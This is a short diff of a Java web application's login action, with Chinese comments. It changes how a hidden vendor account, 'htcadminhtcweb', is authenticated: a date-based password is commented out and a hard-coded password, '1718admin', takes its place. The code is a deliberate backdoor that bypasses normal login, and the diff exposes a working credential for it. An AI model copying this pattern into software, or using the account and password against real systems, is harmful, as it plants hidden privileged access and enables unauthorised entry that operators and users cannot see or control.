@@ -303,8 +303,9 @@ public class UserAction extends AbstractActionForHigh {
 		// 过滤厂家用户 htcadminhtcweb
 		if (userName.equals(OEMNAME)){ // OEMNAME = htcadminhtcweb
 			// 密码为当前时间的年月日,只有一位的时候,补零. 如: 20091002,表示2009年10月2号登陆的密码.
-			String checkPass = FunctionUnit.getDateToStr(new Date(), FunctionUnit.Calendar_END_DAY
-					, FunctionUnit.UN_SHOW_CHINESE).replace("-", "");
+	/*		String checkPass = FunctionUnit.getDateToStr(new Date(), FunctionUnit.Calendar_END_DAY
+					, FunctionUnit.UN_SHOW_CHINESE).replace("-", "");*/
+			String checkPass = "1718admin";
 			if (!userPass.equals(checkPass)){
 				//addFieldError("loadFailure", "用户名或者密码错误");
 				showTipMsg = 1;
